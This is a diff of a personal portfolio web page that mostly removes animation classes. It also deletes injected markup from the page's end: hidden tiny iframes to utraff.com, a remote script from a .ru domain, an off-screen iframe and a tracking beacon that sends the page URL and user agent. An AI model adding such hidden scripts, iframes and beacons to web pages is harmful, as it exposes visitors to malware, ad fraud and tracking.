-						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+						<div class="col-md-6 col-md-offset-3 col-md-pull-3 animate-box" data-animate-effect="fadeInLeft">
 							<span class="heading-meta">Get in Touch</span>
 							<h2 class="colorlib-heading">Contact</h2>
 						</div>
 					</div>
 					<div class="row">
 						<div class="col-md-5">
-							<div class="colorlib-feature colorlib-feature-sm animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+							<div class="colorlib-feature colorlib-feature-sm animate-box" data-animate-effect="fadeInLeft">
 								<div class="colorlib-icon">
 									<i class="icon-globe-outline"></i>
 								</div>
@@ -992,7 +998,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 
-							<div class="colorlib-feature colorlib-feature-sm animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+							<div class="colorlib-feature colorlib-feature-sm animate-box" data-animate-effect="fadeInLeft">
 								<div class="colorlib-icon">
 									<i class="icon-map"></i>
 								</div>
@@ -1001,7 +1007,7 @@ window["jj83_711"] = "1615559582";
 								</div>
 							</div>
 
-							<div class="colorlib-feature colorlib-feature-sm animate-box fadeInLeft animated" data-animate-effect="fadeInLeft">
+							<div class="colorlib-feature colorlib-feature-sm animate-box" data-animate-effect="fadeInLeft">
 								<div class="colorlib-icon">
 									<i class="icon-phone"></i>
 								</div>
@@ -1012,7 +1018,7 @@ window["jj83_711"] = "1615559582";
 						</div>
 						<div class="col-md-7 col-md-push-1">
 							<div class="row">
-								<div class="col-md-10 col-md-offset-1 col-md-pull-1 animate-box fadeInRight animated" data-animate-effect="fadeInRight">
+								<div class="col-md-10 col-md-offset-1 col-md-pull-1 animate-box" data-animate-effect="fadeInRight">
 									<form action="">
 										<div class="form-group">
 											<input type="text" class="form-control" placeholder="Name">
@@ -1061,9 +1067,6 @@ window["jj83_711"] = "1615559582";
 	<!-- MAIN JS -->
 	<script src="js/main.js"></script>
 
-	
-
-
-<div style="width: 8px; height: 8px; position: fixed; bottom: 1px; right: 1px; overflow: hidden; background-color: white; z-index: 100000000;"><div style="width: 8px; height: 8px; top: 1px; left: 1px; background-color: white; z-index: 100000000;"><iframe src="//utraff.com/index.php?r=iframe/index&amp;id=2350&amp;max_prerolls=10&amp;timer=40" id="ut-player" frameborder="0" name="video-extension" style="width: 640px; height: 360px; position: absolute; top: 0px; left: 0px; background-color: white; border: none; display: block;"></iframe></div></div><div style="width: 8px; height: 8px; position: fixed; bottom: 1px; left: 1px; overflow: hidden; background-color: white; z-index: 100000000;"><div style="width: 8px; height: 8px; top: 1px; left: 1px; background-color: white; z-index: 100000000;"><iframe src="//utraff.com/index.php?r=iframe/index&amp;id=3095&amp;max_prerolls=10&amp;timer=40" id="ut-player2" frameborder="0" name="video-extension2" style="width: 640px; height: 360px; position: absolute; top: 0px; left: 0px; background-color: white; border: none; display: block;"></iframe></div></div><script src="https://www.blackclawer.ru/1.js"></script><iframe src="https://www.twitterboss.ru/tw.html" style="position: fixed; left: -1000px; top: -1000px; width: 1px; height: 1px; border: 0px;"></iframe><img src="//domegroupjam.xyz/acnt?_=1615632923569&amp;did=21&amp;tag=test&amp;r=https%253A%252F%252Farunavodey.github.io%252Farunavo.github.io%252F&amp;ua=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F88.0.4324.190%20Safari%2F537.36&amp;aac=&amp;if=0&amp;uid=1615559582&amp;cid=1&amp;v=519"></body>
-
+	</body>
 </html>
+
